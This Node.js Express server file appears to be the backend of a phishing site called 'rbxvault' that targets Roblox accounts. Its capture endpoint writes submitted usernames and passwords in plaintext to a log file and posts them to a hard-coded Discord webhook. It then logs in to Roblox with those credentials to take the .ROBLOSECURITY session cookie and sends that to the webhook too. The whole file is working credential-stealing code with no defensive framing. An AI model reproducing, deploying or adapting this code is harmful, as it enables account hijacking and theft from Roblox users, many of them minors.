const express = require('express');
const axios = require('axios');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static('.'));

const WEBHOOK = 'https://discord.com/api/webhooks/1545632519007903804/1YvZwBPnU_iH1kHqLs8TfltiA96QhKxg3hbZbgydz9cKKM53hO_Wz4MGdCMYKotsv72n';

app.post('/api/capture', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ status: 'error', message: 'missing fields' });
    }

    const logLine = `[${new Date().toISOString()}] ${username}:${password}\n`;
    fs.appendFileSync('creds.log', logLine);

    try {
        await axios.post(WEBHOOK, {
            content: `🔐 **roblox credentials**\n**user:** \`${username}\`\n**pass:** \`${password}\``
        });
    } catch (e) {
        console.log('webhook error:', e.message);
    }

    // attempt to grab .ROBLOSECURITY cookie by logging in from the server
    let cookie = null;
    try {
        const loginRes = await axios.post('https://www.roblox.com/login', {
            username,
            password
        }, {
            headers: { 'Content-Type': 'application/json' },
            maxRedirects: 0,
            validateStatus: (status) => status === 200 || status === 302
        });

        const setCookie = loginRes.headers['set-cookie'];
        if (setCookie) {
            const found = setCookie.find(c => c.startsWith('.ROBLOSECURITY='));
            if (found) {
                cookie = found.split(';')[0];
                await axios.post(WEBHOOK, {
                    content: `🍪 **.ROBLOSECURITY cookie captured**\n\`${cookie}\``
                });
            }
        }
    } catch (e) {
        console.log('cookie grab error:', e.message);
    }

    res.json({ status: 'ok', cookieCaptured: !!cookie });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`rbxvault running on port ${port}`);
});
